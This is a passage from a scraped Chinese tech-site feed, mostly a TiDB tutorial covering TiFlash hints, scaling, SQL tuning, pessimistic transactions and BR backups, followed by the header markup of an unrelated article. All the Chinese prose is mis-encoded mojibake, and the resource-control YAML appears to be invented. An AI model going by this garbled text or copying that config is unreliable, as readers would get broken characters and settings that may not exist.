<span class="hljs-comment">-- å¼ºåˆ¶æŸ¥è¯¢èµ°TiFlashï¼ˆTPC-H Query6ä¼˜åŒ–ï¼‰</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-comment">/*+ read_from_storage(tiflash[lineitem]) */</span> 
       <span class="hljs-built_in">sum</span>(l_extendedprice <span class="hljs-operator">*</span> l_discount) <span class="hljs-keyword">as</span> revenue
<span class="hljs-keyword">FROM</span> lineitem
<span class="hljs-keyword">WHERE</span> l_shipdate <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'1994-01-01'</span>
  <span class="hljs-keyword">AND</span> l_shipdate <span class="hljs-operator">&lt;</span> date_add(<span class="hljs-string">'1994-01-01'</span>, <span class="hljs-type">interval</span> <span class="hljs-string">'1'</span> <span class="hljs-keyword">year</span>)
  <span class="hljs-keyword">AND</span> l_discount <span class="hljs-keyword">between</span> <span class="hljs-number">0.06</span> <span class="hljs-operator">-</span> <span class="hljs-number">0.01</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">0.06</span> <span class="hljs-operator">+</span> <span class="hljs-number">0.01</span>
  <span class="hljs-keyword">AND</span> l_quantity <span class="hljs-operator">&lt;</span> <span class="hljs-number">24</span>;
</code></pre>
<p>æ­¤ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨TiFlashåŠ é€Ÿåˆ†æå‹æŸ¥è¯¢ï¼Œ<code>READ_FROM_STORAGE</code>æç¤ºç¬¦å¼ºåˆ¶ä¼˜åŒ–å™¨ä½¿ç”¨åˆ—å¼å­˜å‚¨ã€‚</p>
<h3 data-id="heading-6">2.2 å¼¹æ€§æ‰©å±•ä¸è‡ªåŠ¨è¿ç»´</h3>
<p>TiDBæ”¯æŒ<strong>åœ¨çº¿å¼¹æ€§æ‰©å±•</strong>ï¼Œå¯åœ¨ä¸å½±å“ä¸šåŠ¡çš„æƒ…å†µä¸‹åŠ¨æ€å¢å‡èŠ‚ç‚¹ã€‚è®¡ç®—å±‚ï¼ˆTiDB Serverï¼‰å’Œå­˜å‚¨å±‚ï¼ˆTiKVï¼‰å¯ä»¥ç‹¬ç«‹æ‰©å±•ï¼Œæ ¹æ®ä¸šåŠ¡éœ€æ±‚çµæ´»è°ƒæ•´ã€‚</p>
<p><strong>è‡ªåŠ¨æ•…éšœæ¢å¤</strong>æœºåˆ¶åŸºäºRaftåè®®å®ç°ã€‚å½“å°‘æ•°èŠ‚ç‚¹æ•…éšœæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨é€‰ä¸¾æ–°Leaderï¼Œå¹¶åœ¨å…¶ä»–èŠ‚ç‚¹ä¸Šæ¢å¤å‰¯æœ¬æ•°æ®ï¼Œå®ç°é‡‘èçº§100%æ•°æ®å¼ºä¸€è‡´æ€§ä¿è¯ã€‚æ•…éšœè½¬ç§»è¿‡ç¨‹å¯¹åº”ç”¨é€æ˜ï¼Œå®¢æˆ·ç«¯åªéœ€å®ç°é‡è¯•é€»è¾‘å³å¯ã€‚</p>
<p>æ‰©ç¼©å®¹æ“ä½œå¯é€šè¿‡TiUPå·¥å…·ç®€å•å®Œæˆï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># æ°´å¹³æ‰©å±•TiDB Server</span>
tiup cluster scale-<span class="hljs-keyword">out</span> &lt;cluster-name&gt; tidb.yaml

<span class="hljs-meta"># å‚ç›´æ‰©å±•TiKVèŠ‚ç‚¹é…ç½®</span>
tiup cluster edit-config &lt;cluster-name&gt;
</code></pre>
<p>è¿™ç§<strong>æ— æ„Ÿæ‰©å®¹èƒ½åŠ›</strong>ä½¿TiDBç‰¹åˆ«é€‚åˆä¸šåŠ¡å¿«é€Ÿå¢é•¿æˆ–æµé‡æ³¢åŠ¨å¤§çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-7">2.3 æ•°æ®è¿ç§»ä¸ç”Ÿæ€é›†æˆ</h3>
<p>TiDBæ‹¥æœ‰ä¸°å¯Œçš„å·¥å…·é“¾ç”Ÿæ€ï¼Œæä¾›å®Œæ•´çš„æ•°æ®ç®¡ç†è§£å†³æ–¹æ¡ˆã€‚ä¸»è¦å·¥å…·åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>DMï¼ˆData Migrationï¼‰</strong> ï¼šä»MySQLåˆ°TiDBçš„æ•°æ®è¿ç§»å·¥å…·ï¼Œæ”¯æŒå…¨é‡å’Œå¢é‡åŒæ­¥ã€‚</li>
<li><strong>BRï¼ˆBackup &amp; Restoreï¼‰</strong> ï¼šé›†ç¾¤çº§æ•°æ®å¤‡ä»½ä¸æ¢å¤å·¥å…·ï¼Œæ”¯æŒåˆ†å¸ƒå¼å¤‡ä»½ã€‚</li>
<li><strong>TiCDC</strong>ï¼šå˜æ›´æ•°æ®æ•è·ä¸åŒæ­¥å·¥å…·ï¼Œå¯å°†æ•°æ®åŒæ­¥åˆ°MySQLã€Kafkaç­‰ä¸‹æ¸¸ç³»ç»Ÿã€‚</li>
</ul>
<p>ä¸MySQLçš„é«˜åº¦å…¼å®¹æ€§æ˜¯TiDBçš„ä¸€å¤§ä¼˜åŠ¿ï¼Œæ”¯æŒå¤§å¤šæ•°MySQLè¯­æ³•ã€å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°å’Œè§¦å‘å™¨ï¼Œä½¿å¾—ç°æœ‰MySQLåº”ç”¨å¯ä»¥å¹³æ»‘è¿ç§»ã€‚æ­¤å¤–ï¼ŒTiDBæ•°æ®å¯ä»¥æ–¹ä¾¿åœ°å¯¼å…¥Kafkaï¼Œæ¥å…¥Flinkï¼Œä¹ƒè‡³Hiveã€HDFSã€Amazon S3ã€Sparkç­‰å¤§æ•°æ®ç”Ÿæ€ç»„ä»¶ï¼Œé¿å…äº†æŠ€æœ¯é”å®šé£é™©ã€‚</p>
<h2 data-id="heading-8">3 TiDBåº”ç”¨å®æˆ˜ä¸æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-9">3.1 åº”ç”¨åœºæ™¯åˆ†æ</h3>
<p>TiDBç‰¹åˆ«é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li><strong>é«˜å¹¶å‘OLTPåº”ç”¨</strong>ï¼šç”µå•†ã€é‡‘èã€æ¸¸æˆç­‰éœ€è¦å¤„ç†å¤§é‡å¹¶å‘äº‹åŠ¡çš„åœºæ™¯</li>
<li><strong>å®æ—¶åˆ†æç³»ç»Ÿ</strong>ï¼šéœ€è¦åŒæ—¶å¤„ç†äº‹åŠ¡å’Œåˆ†ææŸ¥è¯¢çš„HTAPåœºæ™¯</li>
<li><strong>å¤§æ•°æ®é‡å­˜å‚¨</strong>ï¼šå•è¡¨æ•°æ®é‡è¾¾æ•°åäº¿ç”šè‡³ä¸Šç™¾äº¿çš„è®°å½•å­˜å‚¨å’ŒæŸ¥è¯¢éœ€æ±‚</li>
<li><strong>MySQLè¿ç§»å‡çº§</strong>ï¼šä»MySQLè¿ç§»åˆ°åˆ†å¸ƒå¼æ¶æ„çš„å¹³æ»‘å‡çº§è·¯å¾„</li>
</ul>
<p>æŸé‡‘èä¼ä¸šæ¡ˆä¾‹æ˜¾ç¤ºï¼Œé€šè¿‡éƒ¨ç½²TiDBç§æœ‰äº‘è§£å†³æ–¹æ¡ˆï¼Œå®ç°äº†æ•°æ®çš„å®æ—¶åˆ†æå’Œé«˜æ•ˆå¤„ç†ï¼ŒæˆåŠŸåº”å¯¹äº†æ•°æ®é‡æ¿€å¢å’Œä¸šåŠ¡å¤æ‚åº¦æå‡çš„æŒ‘æˆ˜ã€‚æŸç”µä¿¡ä¸ªäººè´¦å•ç³»ç»Ÿä»MyCATè¿ç§»åˆ°TiDBåï¼Œå•è¡¨æ•°æ®é‡ä»80äº¿æ‰©å±•åˆ°100äº¿ï¼Œæ•°æ®å­˜å‚¨å‘¨æœŸç”±åŠå¹´å»¶é•¿è‡³3-5å¹´ï¼ŒQPSå’Œå»¶è¿Ÿéƒ½æœ‰æ˜¾è‘—æ”¹å–„ã€‚</p>
<h3 data-id="heading-10">3.2 SQLä¼˜åŒ–æœ€ä½³å®è·µ</h3>
<p>åœ¨TiDBä¸­ï¼ŒSQLæ€§èƒ½ä¼˜åŒ–è‡³å…³é‡è¦ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æ ¸å¿ƒä¼˜åŒ–å»ºè®®ï¼š</p>
<ul>
<li><strong>é¿å…å…¨è¡¨æ‰«æ</strong>ï¼šé€šè¿‡åˆ›å»ºåˆé€‚çš„ç´¢å¼•é¿å…å…¨è¡¨æ‰«æã€‚ä½¿ç”¨EXPLAINåˆ†ææŸ¥è¯¢è®¡åˆ’ï¼Œç¡®ä¿æŸ¥è¯¢æœ‰æ•ˆåˆ©ç”¨ç´¢å¼•ã€‚</li>
<li><strong>æ§åˆ¶äº‹åŠ¡å¤§å°</strong>ï¼šå°†æ¯ä¸ªäº‹åŠ¡çš„è®°å½•æ•°æ§åˆ¶åœ¨200æ¡ä»¥å†…ï¼Œå•æ¡è®°å½•çš„æ•°æ®å¤§å°å°äº100KBã€‚å¤§äº‹åŠ¡ä¼šå¢åŠ å»¶è¿Ÿï¼Œå®¹æ˜“å¼•å‘å†²çªå’Œå†…å­˜å‹åŠ›ã€‚</li>
<li><strong>ç´¢å¼•ä¼˜åŒ–</strong>ï¼šä¸€å¼ è¡¨çš„ç´¢å¼•æ•°é‡å»ºè®®ä¸è¶…è¿‡7ä¸ªã€‚ä½¿ç”¨è¦†ç›–ç´¢å¼•é¿å…å›è¡¨æ“ä½œï¼Œå¯¹å­—ç¬¦ä¸²åˆ—è€ƒè™‘ä½¿ç”¨å‰ç¼€ç´¢å¼•èŠ‚çœç©ºé—´ã€‚</li>
</ul>
<p>æŸ¥è¯¢ä¼˜åŒ–ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ä¸å¥½çš„å†™æ³•ï¼šä½¿ç”¨ORå¯¼è‡´å…¨è¡¨æ‰«æ</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'alice'</span> <span class="hljs-keyword">OR</span> phone <span class="hljs-operator">=</span> <span class="hljs-string">'123456'</span>;

<span class="hljs-comment">-- ä¼˜åŒ–å†™æ³•ï¼šä½¿ç”¨UNIONæ›¿ä»£OR</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'alice'</span> 
<span class="hljs-keyword">UNION</span> 
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> phone <span class="hljs-operator">=</span> <span class="hljs-string">'123456'</span>;

<span class="hljs-comment">-- åˆ›å»ºè¦†ç›–ç´¢å¼•ä¼˜åŒ–æŸ¥è¯¢</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_name_age <span class="hljs-keyword">ON</span> users(name, age);
<span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'alice'</span>; <span class="hljs-comment">-- æ— éœ€å›è¡¨</span>
</code></pre>
<h3 data-id="heading-11">3.3 åˆ†å¸ƒå¼äº‹åŠ¡ä¼˜åŒ–</h3>
<p>TiDBé€šè¿‡ä»¥ä¸‹æœºåˆ¶ä¼˜åŒ–åˆ†å¸ƒå¼äº‹åŠ¡æ€§èƒ½ï¼š</p>
<ul>
<li><strong>å¼‚æ­¥æäº¤ï¼ˆAsync Commitï¼‰</strong> ï¼šTiDB 5.0çš„Async Commitç‰¹æ€§åœ¨äº‹åŠ¡æäº¤çš„ç¬¬äºŒé˜¶æ®µå®ç°å¼‚æ­¥æäº¤ï¼Œå¯¹äºå°äº‹åŠ¡è¾¾åˆ°ç±»ä¼¼1PCçš„æ•ˆæœï¼Œå‡å°‘ç½‘ç»œå¾€è¿”ã€‚</li>
<li><strong>æ‚²è§‚äº‹åŠ¡æ¨¡å¼</strong>ï¼šé«˜å†²çªåœºæ™¯ä¸‹ä½¿ç”¨æ‚²è§‚äº‹åŠ¡æ¨¡å¼ï¼Œå‡å°‘äº‹åŠ¡é‡è¯•å¼€é”€ã€‚</li>
<li><strong>æ‰¹é‡æ“ä½œ</strong>ï¼šä½¿ç”¨æ‰¹é‡æ’å…¥ä»£æ›¿å•æ¡æ’å…¥ï¼Œæ˜¾è‘—æå‡ååé‡ã€‚</li>
</ul>
<p>Javaåº”ç”¨ä¸­ä½¿ç”¨æ‚²è§‚äº‹åŠ¡çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Javaåº”ç”¨ä½¿ç”¨æ‚²è§‚äº‹åŠ¡</span>
try (Connection conn = ds.getConnection()) {
    conn<span class="hljs-selector-class">.setAutoCommit</span>(false);
    <span class="hljs-comment">// å¼€å¯æ‚²è§‚äº‹åŠ¡æ¨¡å¼</span>
    conn<span class="hljs-selector-class">.createStatement</span>()<span class="hljs-selector-class">.execute</span>("SET tidb_txn_mode = 'pessimistic'");
    
    <span class="hljs-comment">// å…ˆæŸ¥è¯¢åæ›´æ–°ï¼ˆå¸¦é”ï¼‰</span>
    ResultSet rs = conn<span class="hljs-selector-class">.createStatement</span>()<span class="hljs-selector-class">.executeQuery</span>(
        "SELECT balance FROM accounts WHERE id = <span class="hljs-number">1001</span> FOR UPDATE");
    
    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘å¤„ç†</span>
    BigDecimal newBalance = rs<span class="hljs-selector-class">.getBigDecimal</span>(<span class="hljs-number">1</span>)<span class="hljs-selector-class">.subtract</span>(amount);
    PreparedStatement ps = conn<span class="hljs-selector-class">.prepareStatement</span>(
        "UPDATE accounts SET balance = ? WHERE id = <span class="hljs-number">1001</span>");
    ps<span class="hljs-selector-class">.setBigDecimal</span>(<span class="hljs-number">1</span>, newBalance);
    ps<span class="hljs-selector-class">.executeUpdate</span>();
    conn<span class="hljs-selector-class">.commit</span>();
}
</code></pre>
<p>æ­¤ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ‚²è§‚äº‹åŠ¡é¿å…é«˜å¹¶å‘ä¸‹çš„æ•°æ®ç«äº‰é—®é¢˜ã€‚</p>
<h3 data-id="heading-12">3.4 çƒ­ç‚¹é—®é¢˜å¤„ç†ä¸èµ„æºç®¡ç†</h3>
<p>TiDBé€šè¿‡å¤šç§æœºåˆ¶å¤„ç†çƒ­ç‚¹é—®é¢˜ï¼š</p>
<ul>
<li><strong>AUTO_RANDOM</strong>ï¼šä½¿ç”¨AUTO_RANDOMä»£æ›¿AUTO_INCREMENTæ¥åˆ†é…ä¸»é”®ï¼Œé¿å…å•è°ƒé€’å¢ä¸»é”®å¯¼è‡´çš„å†™çƒ­ç‚¹ã€‚</li>
<li><strong>SHARD_ROW_ID_BITS</strong>ï¼šé€šè¿‡è¡Œå·åˆ†ç‰‡åˆ†æ•£çƒ­ç‚¹ã€‚</li>
<li><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼šå¯¹é¢‘ç¹è®¿é—®çš„å°è¡¨æ•°æ®ä½¿ç”¨TiDBå†…ç½®ç¼“å­˜æˆ–åº”ç”¨å±‚ç¼“å­˜ï¼ˆå¦‚Redisï¼‰ã€‚</li>
</ul>
<p>èµ„æºéš”ç¦»é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># tidb-serverèµ„æºæ§åˆ¶é…ç½®</span>
<span class="hljs-attr">resource-control:</span>
  <span class="hljs-attr">request-unit:</span>
    <span class="hljs-comment"># é™åˆ¶OLTPè´Ÿè½½</span>
    <span class="hljs-attr">oltp:</span>
      <span class="hljs-attr">max-tasks:</span> <span class="hljs-number">500</span>
      <span class="hljs-attr">cpu-time-per-sec:</span> <span class="hljs-number">0.8</span>
    <span class="hljs-comment"># ä¿éšœOLAPèµ„æº</span>
    <span class="hljs-attr">olap:</span>
      <span class="hljs-attr">min-tasks:</span> <span class="hljs-number">200</span>
      <span class="hljs-attr">cpu-time-per-sec:</span> <span class="hljs-number">1.2</span>
</code></pre>
<p>æ­¤é…ç½®ç¡®ä¿OLAPæŸ¥è¯¢ä¸ä¼šå½±å“OLTPäº‹åŠ¡çš„æ€§èƒ½ã€‚</p>
<h2 data-id="heading-13">4 éƒ¨ç½²æ¶æ„ä¸è¿ç»´å®è·µ</h2>
<h3 data-id="heading-14">4.1 é«˜å¯ç”¨æ¶æ„è®¾è®¡</h3>
<p>TiDBæä¾›é‡‘èçº§é«˜å¯ç”¨ä¿éšœï¼Œé€šè¿‡ä»¥ä¸‹æœºåˆ¶å®ç°ï¼š</p>
<ul>
<li><strong>å¤šå‰¯æœ¬æœºåˆ¶</strong>ï¼šæ•°æ®é»˜è®¤ä¿å­˜3å‰¯æœ¬ï¼Œåˆ†å¸ƒåœ¨ä¸åŒçš„æ•…éšœåŸŸã€‚</li>
<li><strong>è‡ªåŠ¨æ•…éšœè½¬ç§»</strong>ï¼šå°‘æ•°èŠ‚ç‚¹æ•…éšœæ—¶è‡ªåŠ¨åˆ‡æ¢ï¼Œæ— éœ€äººå·¥å¹²é¢„ã€‚</li>
<li><strong>è·¨æ•°æ®ä¸­å¿ƒéƒ¨ç½²</strong>ï¼šæ”¯æŒåŒåŸä¸‰ä¸­å¿ƒã€ä¸¤åœ°ä¸‰ä¸­å¿ƒç­‰éƒ¨ç½²æ¨¡å¼ï¼Œä¿è¯ä¸šåŠ¡è¿ç»­æ€§ã€‚</li>
</ul>
<p>è·¨æ•°æ®ä¸­å¿ƒéƒ¨ç½²ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">RegionA (ä¸»ä¸­å¿ƒ)         <span class="hljs-built_in">RegionB</span>(ç¾å¤‡ä¸­å¿ƒ)
â”œâ”€â”€ <span class="hljs-number">3</span> PDèŠ‚ç‚¹ï¼ˆå¤šæ•°æ´¾ï¼‰    â”œâ”€â”€ <span class="hljs-number">2</span> PD Learner
â”œâ”€â”€ <span class="hljs-number">10</span> TiKVèŠ‚ç‚¹ï¼ˆæ ‡ç­¾zone=<span class="hljs-selector-tag">a</span>ï¼‰ â”œâ”€â”€ <span class="hljs-number">5</span> TiKVèŠ‚ç‚¹ï¼ˆæ ‡ç­¾zone=<span class="hljs-selector-tag">b</span>ï¼‰
â””â”€â”€ <span class="hljs-number">2</span> TiDBèŠ‚ç‚¹          â””â”€â”€ <span class="hljs-number">1</span> TiDBèŠ‚ç‚¹
</code></pre>
<p>æ­¤æ‹“æ‰‘ç¡®ä¿å•ä¸ªæ•°æ®ä¸­å¿ƒæ•…éšœæ—¶æœåŠ¡ä»ç„¶å¯ç”¨ã€‚</p>
<h3 data-id="heading-15">4.2 ç›‘æ§ä¸å‘Šè­¦ä½“ç³»</h3>
<p>TiDBé›†æˆäº†Prometheuså’ŒGrafanaæ„å»ºå®Œæ•´çš„ç›‘æ§ä½“ç³»ï¼Œå…³é”®ç›‘æ§æŒ‡æ ‡åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>é›†ç¾¤æ¦‚è§ˆ</strong>ï¼šQPSã€å»¶è¿Ÿã€è¿æ¥æ•°ç­‰æ ¸å¿ƒæŒ‡æ ‡</li>
<li><strong>TiDBæ€§èƒ½</strong>ï¼šæŸ¥è¯¢è€—æ—¶ã€æ‰§è¡Œæ—¶é—´ã€æ…¢æŸ¥è¯¢åˆ†æ</li>
<li><strong>TiKVçŠ¶æ€</strong>ï¼šCPUã€IOè´Ÿè½½ã€Regionå¥åº·çŠ¶æ€ã€è°ƒåº¦æ“ä½œ</li>
<li><strong>PDè°ƒåº¦</strong>ï¼šBalanceæ“ä½œã€çƒ­ç‚¹åˆ†å¸ƒã€è°ƒåº¦é˜Ÿåˆ—</li>
</ul>
<p>é€šè¿‡è®¾ç½®åˆç†çš„å‘Šè­¦é˜ˆå€¼ï¼Œå¯ä»¥åŠæ—¶å‘ç°å¹¶å¤„ç†æ½œåœ¨é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå½“å‡ºç°"server is busy"æˆ–"channel full"é”™è¯¯æ—¶ï¼Œé€šå¸¸æ„å‘³ç€ç³»ç»Ÿå·²è¾¾ç“¶é¢ˆï¼Œéœ€è¦æ‰©å®¹æˆ–ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-16">4.3 å¤‡ä»½ä¸æ¢å¤ç­–ç•¥</h3>
<p>TiDBæä¾›å¤šç§æ•°æ®ä¿æŠ¤æœºåˆ¶ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨å¤‡ä»½</strong>ï¼šæ”¯æŒå…¨é‡å’Œå¢é‡å¤‡ä»½ï¼Œå¯å°†æ•°æ®å¤‡ä»½åˆ°å¯¹è±¡å­˜å‚¨ã€‚</li>
<li><strong>æ—¶é—´ç‚¹æ¢å¤ï¼ˆPITRï¼‰</strong> ï¼šæ”¯æŒç²¾ç¡®åˆ°ç§’çº§çš„æ•°æ®æ¢å¤ã€‚</li>
<li><strong>å¼‚åœ°å®¹ç¾</strong>ï¼šé€šè¿‡TiCDCå°†æ•°æ®åŒæ­¥åˆ°å¼‚åœ°é›†ç¾¤ï¼Œå®ç°å®¹ç¾ã€‚</li>
</ul>
<p>å¤‡ä»½ç­–ç•¥ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"># ä½¿ç”¨BRè¿›è¡Œå…¨é‡å¤‡ä»½
br backup <span class="hljs-keyword">full</span> \
    <span class="hljs-comment">--pd "&lt;pd-addresses&gt;" \</span>
    <span class="hljs-comment">--storage "s3://backup-data/backup-2023" \</span>
    <span class="hljs-comment">--ratelimit 128</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ä¸€ä¸ªâ€œä¸èƒ½è¾“è´Ÿå·â€çš„æ•°å­—è¾“å…¥æ¡†è¯´èµ·ï¼šWeb Component æ•°å­—è¾“å…¥ç»„ä»¶é‡æ„å®å½•]]></title>    <link>https://juejin.cn/post/7582861402278395938</link>    <guid>https://juejin.cn/post/7582861402278395938</guid>    <pubDate>2025-12-13T09:56:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582861402278395938" data-draft-id="7582533464246009890" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ä¸€ä¸ªâ€œä¸èƒ½è¾“è´Ÿå·â€çš„æ•°å­—è¾“å…¥æ¡†è¯´èµ·ï¼šWeb Component æ•°å­—è¾“å…¥ç»„ä»¶é‡æ„å®å½•"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-13T09:56:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è«çŸ³"/> <meta itemprop="url" content="https://juejin.cn/user/281920608933006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ä¸€ä¸ªâ€œä¸èƒ½è¾“è´Ÿå·â€çš„æ•°å­—è¾“å…¥æ¡†è¯´èµ·ï¼šWeb Component æ•°å­—è¾“å…¥ç»„ä»¶é‡æ„å®å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/281920608933006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è«çŸ³
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T09:56:13.000Z" title="Sat Dec 13 2025 09:56:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0